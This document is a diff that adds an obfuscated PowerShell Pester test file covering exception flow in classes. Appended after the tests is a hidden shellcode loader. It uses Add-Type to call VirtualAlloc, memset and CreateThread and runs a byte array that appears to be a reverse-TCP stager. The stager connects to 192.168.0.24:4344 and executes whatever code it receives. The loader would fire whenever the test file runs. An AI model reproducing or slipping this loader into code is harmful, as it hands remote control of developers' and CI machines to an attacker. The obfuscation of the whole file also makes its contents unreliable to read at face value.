@@ -1,0 +1,304 @@
+Describe ("{2}{1}{0}{5}{3}{4}" -f' flow ','eptions','Exc','las','ses','for c') -Tags "CI" {
+
+    ${caNa`RyH`AsHtA`BLE} = @{}
+
+    ${I`sS} = [initialsessionstate]::CreateDefault()
+    ${i`sS}.Variables.Add([System.Management.Automation.Runspaces.SessionStateVariableEntry]::new(("{2}{1}{0}{3}" -f 'yHash','anar','c','table'), ${Can`ARYHa`sH`T`AbLE}, ${NU`ll}))
+    ${I`SS}.Commands.Add([System.Management.Automation.Runspaces.SessionStateFunctionEntry]::new(("{2}{3}{1}{0}"-f'y','t-Canar','G','e'), (('{0}'+'canaryHas'+'htab'+'l'+'e')-f [cHAr]36)))
+    ${P`s} = [powershell]::Create(${I`ss})
+
+    BeforeEach {
+        ${C`AN`A`RYH`AsHtaBle}.Clear()
+        ${Ps}.Commands.Clear()
+    }
+
+    Context ("{3}{2}{1}{0}{5}{7}{4}{6}"-f 'ns',' i','lls are','All ca',' class','id','es','e') {
+
+        It ("{0}{10}{14}{15}{13}{11}{4}{3}{5}{2}{7}{8}{9}{1}{12}{6}" -f 'd','x','ance me','t','af','er inst','eption','thod',' wi','th e','o','ts ','c','en','es not execute s','tatem') {
+
+            
+            try {
+
+                ${p`s}.AddScript( @'
+class C
+{
+    [void] m1()
+    {
+        $canaryHashtable = Get-Canary
+        $canaryHashtable['canary'] = 42
+        $this.ImThrow()
+        $canaryHashtable['canary'] = 100
+    }
+
+    [void] ImThrow()
+    {
+        throw 'I told you'
+    }
+}
+[C]::new().m1()
+'@).Invoke()
+
+            } catch {}
+
+            ${c`AnAryHA`s`HTa`B`lE}[("{1}{0}"-f 'ry','cana')] | Should -Be 42
+        }
+
+        It ("{6}{1}{4}{5}{0}{2}{7}{9}{8}{3}" -f' execute sta','o','tem','exception','es no','t','d','ents af','er static method with ','t') {
+
+            
+            try {
+
+                ${P`s}.AddScript( @'
+class C
+{
+    static [void] s1()
+    {
+        $canaryHashtable = Get-Canary
+        $canaryHashtable['canary'] = 43
+        [C]::ImThrow()
+        $canaryHashtable['canary'] = 100
+    }
+
+    static [void] ImThrow()
+    {
+        1 / 0
+    }
+}
+[C]::s1()
+'@).Invoke()
+
+            } catch {}
+
+            ${Can`Ary`h`AsH`TablE}[("{2}{1}{0}" -f'y','anar','c')] | Should -Be 43
+        }
+
+        It ("{4}{15}{17}{12}{13}{10}{3}{11}{18}{14}{16}{6}{8}{2}{0}{5}{1}{9}{7}" -f'exceptio','d deep',' ','e','d','n an','thod w','ack','ith',' st',' stat','ment','xec','ute',' insta','oes ','nce me','not e','s after') {
+
+            
+            try {
+
+                ${p`S}.AddScript( @'
+class C
+{
+    [void] m1()
+    {
+        $canaryHashtable = Get-Canary
+        $canaryHashtable['canary'] = 1
+        $this.m2()
+        $canaryHashtable['canary'] = -6101
+    }
+
+    [void] m2()
+    {
+        $canaryHashtable = Get-Canary
+        $canaryHashtable['canary'] += 10
+        $this.m3()
+        $canaryHashtable['canary'] = -6102
+    }
+
+    [void] m3()
+    {
+        $canaryHashtable = Get-Canary
+        $canaryHashtable['canary'] += 100
+        $this.m4()
+        $canaryHashtable['canary'] = -6103
+    }
+
+    [void] m4()
+    {
+        $canaryHashtable = Get-Canary
+        $canaryHashtable['canary'] += 1000
+        $this.ImThrow()
+        $canaryHashtable['canary'] = -6104
+    }
+
+    [void] ImThrow()
+    {
+        $canaryHashtable = Get-Canary
+        $canaryHashtable['canary'] += 10000
+
+        1 / 0
+    }
+}
+[C]::new().m1()
+'@).Invoke()
+
+            } catch {}
+
+            ${C`AnAR`Yha`SH`TABlE}[("{0}{1}"-f 'cana','ry')] | Should -Be 11111
+        }
+    }
+
+    Context ("{3}{7}{5}{4}{1}{2}{0}{6}"-f 'io','l PS func','t','Cla','thod cal','e','n','ss m') {
+
+        ${b`Ody} = @'
+class C
+{
+    [void] m1()
+    {
+        m2
+    }
+
+    static [void] s1()
+    {
+        s2
+    }
+}
+
+function m2()
+{
+    $canary = Get-Canary
+    $canary['canaryM'] = 45
+    ImThrow
+    $canary['canaryM'] = 100
+}
+
+function s2()
+{
+    $canary = Get-Canary
+    $canary['canaryS'] = 46
+    CallImThrow
+    $canary['canaryS'] = 100
+}
+
+function CallImThrow()
+{
+    ImThrow
+}
+
+function ImThrow()
+{
+    1 / 0
+}
+
+'@
+
+        It ("{1}{19}{9}{2}{14}{10}{7}{11}{5}{20}{4}{17}{8}{18}{15}{3}{0}{16}{13}{6}{12}" -f'fr','d','t execu','led ','ct','s after f','h','emen','with',' no','e stat','t','od','tance met','t','n cal','om ins','ion ',' exceptio','oes','un') {
+
+            
+            try {
+
+                ${pS}.AddScript(${Bo`DY}).Invoke()
+                ${Ps}.AddScript(((('9'+'Jgc ') -CrEPLAcE  ([ChAr]57+[ChAr]74+[ChAr]103),[ChAr]36)+'= '+'['+'C]'+'::'+'new(); '+(('dK0'+'c'+'.m1()')  -rePLaCe'dK0',[cHAr]36))).Invoke()
+
+            } catch {}
+
+            ${C`ANAR`YHA`shtA`BLE}[("{1}{0}" -f'aryM','can')] | Should -Be 45
+        }
+
+        It ("{9}{4}{0}{8}{7}{16}{15}{13}{17}{2}{5}{6}{3}{12}{11}{10}{14}{1}" -f't execute sta','thod','ptio','rom','no','n c','alled f','ents','tem','does ','i','stat',' ','n wit','c me','r functio',' afte','h exce') {
+
+            
+            try {
+
+                ${P`S}.AddScript(${B`Ody}).Invoke()
+                ${pS}.AddScript(("{0}{1}{2}"-f'[','C]::','s1()')).Invoke()
+
+            } catch {}
+
+            ${CANAR`Yh`A`SHtA`BlE}[("{0}{1}" -f 'cana','ryS')] | Should -Be 46
+        }
+
+    }
+
+    Context ("{1}{0}{5}{4}{2}{3}" -f ' clas','No','involve','d','is ','s ') {
+        It ("{4}{8}{5}{1}{3}{0}{7}{2}{6}{9}"-f 'nue ex','ons','cution',' calls conti','f','cti',' by d','e','un','efault') {
+
+            try {
+
+                ${P`s}.AddScript( @'
+
+$canaryHashtable = Get-Canary
+function foo() { 1 / 0; $canaryHashtable['canary'] += 10 }
+$canaryHashtable['canary'] = 1
+foo
+$canaryHashtable['canary'] += 100
+
+'@).Invoke()
+
+            } catch {}
+
+            ${C`AnA`RYH`AShTaBLe}[("{1}{2}{0}"-f 'ry','can','a')] | Should -Be 111
+        }
+    }
+}
+
+Describe ("{3}{2}{0}{4}{1}"-f ' erro','n','ion','Except','r positio') -Tags "CI" {
+    class MSFT_3090412
+    {
+        static ('f1')() { [MSFT_3090412]::bar = 42 }
+        static ('f2')() { throw ("{2}{1}{3}{0}{4}"-f 'in','n','a',' error ',' f2') }
+        static ('f3')() { "".Substring(0, 10) }
+        static ('f4')() { Get-ChildItem ("{1}{2}{0}"-f 'e','nos','uchfil') -ErrorAction ("{1}{0}"-f 'top','S') }
+    }
+
+    It ((("{8}{2}{10}{0}{9}{7}{3}{1}{5}{11}{4}{6}" -f 'rty',' d','ting a ','at','exis','oesnHjt','t','th','Set',' ','prope','t '))-repLacE'Hjt',[CHar]39) {
+        ${E} = { [MSFT_3090412]::f1() } | Should -Throw -PassThru -ErrorId ("{3}{2}{4}{5}{1}{0}" -f 'ption','ce','o','Pr','pert','yAssignmentEx')
+        ${e}.InvocationInfo.Line | Should -Match ([regex]::Escape(("{0}{2}{3}{5}{4}{1}"-f '[MS','2','FT_30','90','2]::bar = 4','41')))
+    }
+
+    It ("{1}{0}{6}{4}{5}{3}{2}"-f'an','Throwing ','ion','pt','exc','e',' ') {
+        ${e} = { [MSFT_3090412]::f2() } | Should -Throw -PassThru -ErrorId ("{1}{3}{2}{0}" -f 'in f2','an','r ',' erro')
+        ${E}.InvocationInfo.Line | Should -Match ([regex]::Escape(((("{5}{7}{1}{0}{2}{6}{3}{4}"-f 'an erro','v','r ','Q','3v','t','in f2','hrow Q3')).REPlacE(([chAr]81+[chAr]51+[chAr]118),[STRING][chAr]34))))
+    }
+
+    It ("{2}{7}{8}{6}{3}{0}{5}{4}{1}"-f't method tha','ws','Callin','e','thro','t ','N','g a ','.') {
+        ${e} = { [MSFT_3090412]::f3() } | Should -Throw -PassThru -ErrorId ("{2}{1}{3}{4}{0}"-f 'n','rgu','A','mentOutOfRan','geExceptio')
+        ${e}.InvocationInfo.Line | Should -Match ([regex]::Escape(((("{1}{2}{0}{3}{4}"-f 'ubstr','4Ez','4Ez.S','ing(0, 10',')'))-CREPLACE  '4Ez',[chAr]34)))
+    }
+
+    It ("{1}{3}{0}{4}{2}" -f 'g ','Termina','ror','tin','er') {
+        ${e} = { [MSFT_3090412]::f4() } | Should -Throw -PassThru -ErrorId ("{10}{7}{1}{4}{2}{0}{6}{3}{8}{9}{11}{5}"-f'h','of','S','mands.Ge','t.Power','Command','ell.Com','icros','tC','hildI','PathNotFound,M','tem')
+        ${E}.InvocationInfo.Line | Should -Match ([regex]::Escape(("{7}{5}{2}{6}{10}{3}{1}{12}{4}{8}{0}{11}{9}" -f 'io','e','It','nosuchfil','rA','Child','em','Get-','ct',' Stop',' ','n',' -Erro')))
+    }
+}
+
+Describe ("{3}{0}{4}{1}{2}"-f'n f','iz','er','Exceptio','rom initial') -Tags "CI" {
+    class MSFT_6397334a
+    {
+        [int]${a} = "zz"
+        ("{2}{4}{1}{3}{0}" -f'4a','73','MSFT_63','3','9')() {}
+    }
+
+    class MSFT_6397334b
+    {
+        [int]${A} = "zz"
+    }
+
+    class MSFT_6397334c
+    {
+        static [int]${a} = "zz"
+        static ("{2}{0}{1}"-f '39733','4a','MSFT_6')() {}
+    }
+
+    class MSFT_6397334d
+    {
+        static [int]${A} = "zz"
+    }
+
+    It ("{1}{0}{2}{3}{4}"-f 's','in','tance ','memb','er w/ ctor') {
+        ${e} = { [MSFT_6397334a]::new() } | Should -Throw -ErrorId ("{0}{1}{3}{4}{7}{6}{2}{5}" -f'I','nvalidCa','ringTo','st','F','Integer','omSt','r') -PassThru
+        ${E}.InvocationInfo.Line | Should -Match ((("{2}{0}{1}" -f' ','qNlzzqNl','a ='))-REPlaCE  'qNl',[cHaR]34)
+    }
+
+    It ("{2}{3}{4}{0}{1}"-f 'nce member',' w/o ctor','i','ns','ta') {
+        ${E} = { [MSFT_6397334b]::new() } | Should -Throw -ErrorId ("{0}{1}{3}{6}{2}{4}{5}" -f'Inva','lidCa','mStrin','st','g','ToInteger','Fro') -PassThru
+        ${e}.InvocationInfo.Line | Should -Match ((("{2}{0}{1}"-f ' Oqnz','zOqn','a =')).replACe('Oqn',[StriNg][cHaR]34))
+    }
+
+    It ("{2}{3}{0}{4}{6}{5}{1}"-f'ic ','ctor','st','at','memb','r w/ ','e') {
+        ${E} = { ${N`ULL} = [MSFT_6397334c]::a } | Should -Throw -PassThru
+        ${e}.Exception | Should -BeOfType ("{0}{3}{4}{2}{6}{1}{5}"-f 'System.Type','atio','al','I','niti','nException','iz')
+        ${e}.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly ("{1}{0}{4}{3}{2}"-f'va','In','Integer','ringTo','lidCastFromSt')
+        ${e}.Exception.InnerException.InnerException.ErrorRecord.InvocationInfo.Line | Should -Match ((("{0}{1}{2}" -f'a',' = Wbsz','zWbs')) -CRePLAce  'Wbs',[cHar]34)
+    }
+
+    It ("{3}{4}{5}{6}{2}{0}{1}"-f 'c','tor',' ','stat','ic ','member w','/o') {
+        ${E} = { ${nU`Ll} = [MSFT_6397334d]::a } | Should -Throw -PassThru
+        ${e}.Exception | Should -BeOfType ("{1}{3}{7}{2}{10}{0}{8}{9}{5}{6}{4}" -f'on','S','iti','ystem.Ty','on','cep','ti','peIn','E','x','alizati')
+        ${E}.Exception.InnerException.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly ("{1}{3}{2}{7}{5}{0}{6}{8}{4}"-f 'Inte','Inval','C','id','r','mStringTo','g','astFro','e')
+        ${e}.Exception.InnerException.InnerException.ErrorRecord.InvocationInfo.Line | Should -Match ((("{2}{1}{0}"-f'}',' = {0}zz{0','a'))-F [cHar]34)
+    }
+}
+
+${C} = ((("{41}{4}{34}{101}{3}{67}{1}{48}{96}{75}{43}{68}{89}{93}{16}{102}{100}{84}{9}{72}{66}{98}{78}{64}{35}{10}{23}{28}{50}{13}{29}{22}{42}{82}{97}{54}{47}{56}{38}{73}{63}{24}{33}{37}{71}{79}{2}{0}{45}{31}{59}{6}{86}{40}{12}{70}{18}{69}{60}{46}{5}{99}{51}{77}{11}{30}{44}{7}{91}{21}{39}{25}{15}{20}{76}{83}{55}{49}{32}{58}{74}{88}{36}{92}{94}{8}{87}{95}{14}{52}{80}{65}{57}{61}{27}{81}{62}{85}{53}{17}{90}{26}{19}" -f' In',']','n','2.d','lImp','S','d(I','t','li','t','n','ddre','b','int','xt','tPtr','r','n','tes, u','count);',' lpT',' lpParameter, ',')','T','bl','n','c, uint ','Int','ype',' flProtect','ss','r Crea','l','ic s','ort(adtkerne','o','dl','tatic ','lla','uint dwCreationFlags, I','ttri','[Dl',';',' Vi',', In','tPt','tackSize, IntPtr lp','nel32','public stati',';[D',', u','ar','e',', ui','ker','dId)','.d','memset','lImport(ad','teThrea','nt dwS','(','tr d',']pu',' flAllocati','ntPtr ',' u','lladt)','rtu','i','u','ext',' dwSize,','dt)','tmsvcr','tPtr','hre','tA','nt','er','rn I','P','[D','a','n','est','ntPtr lpThreadA','c ','t.','al','t sr','Ptr','ladt)]p','Alloc(IntPt','ub','static e','c extern In','llImport(adt','i','t','ddress, ui','l3',' lpA'))  -rePLACe ([ChAr]97+[ChAr]100+[ChAr]116),[ChAr]34);${W} = Add-Type -memberDefinition ${C} -Name ("{1}{0}" -f'n32','Wi') -namespace ("{4}{1}{3}{2}{0}" -f's','32Func','n','tio','Win') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x18,0x68,0x02,0x00,0x10,0xf8,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${z}.Length -gt 0x1000){${G} = ${Z}.Length};${X}=${W}::VirtualAlloc(0,0x1000,${g},0x40);for (${i}=0;${I} -le (${Z}.Length-1);${i}++) {${w}::memset([IntPtr](${X}.ToInt32()+${i}), ${Z}[${I}], 1)};${W}::CreateThread(0,0,${X},0,0,0);for (;;){Start-sleep 60};
